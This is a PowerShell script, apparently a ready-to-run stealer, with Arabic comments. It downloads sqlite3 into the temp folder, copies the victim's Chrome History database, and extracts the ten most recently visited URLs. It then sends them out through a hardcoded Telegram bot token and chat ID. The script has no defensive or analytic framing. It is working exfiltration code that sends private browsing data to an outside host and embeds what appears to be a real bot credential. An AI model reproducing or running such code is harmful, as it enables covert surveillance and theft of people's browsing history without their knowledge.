# En9mm - Final Stable Version - Chrome History Extractor with Telegram Reporting

$Token  = "7921423137:AAHj4kDraZc0BRPk6c6j7TC2vJE5Dy-6j0g"
$ChatID = "774651165"
$Msg    = "🧠 *Chrome Last 10 Visited Sites:*`n"

# مسار SQLite
$sqlitePath = "$env:TEMP\sqlite3.exe"

# تحميل SQLite إذا لم يكن موجود
if (-not (Test-Path $sqlitePath)) {
    Invoke-WebRequest -Uri "https://sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip" -OutFile "$env:TEMP\sqlite.zip"
    Expand-Archive "$env:TEMP\sqlite.zip" -DestinationPath "$env:TEMP\sqlite" -Force
    Move-Item "$env:TEMP\sqlite\sqlite3.exe" $sqlitePath -Force
}

# مسار قاعدة بيانات Chrome
$chromeHistory = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$tempHistory   = "$env:TEMP\chrome_history.db"

if (Test-Path $chromeHistory) {
    Copy-Item $chromeHistory $tempHistory -Force

    # تنفيذ استعلام SQLite
    $query = "SELECT datetime((last_visit_time/1000000)-11644473600, 'unixepoch') as visit_time, url FROM urls ORDER BY last_visit_time DESC LIMIT 10;"
    $results = & $sqlitePath $tempHistory ".headers on" ".mode column" $query

    if ($results) {
        $Msg += "```\n$results\n```"
    } else {
        $Msg += "`n❌ لا توجد بيانات في سجل Chrome."
    }
} else {
    $Msg += "`n⚠️ لم يتم العثور على قاعدة بيانات سجل Chrome."
}

# إرسال التقرير إلى تيليجرام
$uri = "https://api.telegram.org/bot$Token/sendMessage"
Invoke-RestMethod -Uri $uri -Method POST -ContentType "application/json" -Body (@{
    chat_id = $ChatID
    text = $Msg
    parse_mode = "Markdown"
} | ConvertTo-Json -Depth 3)
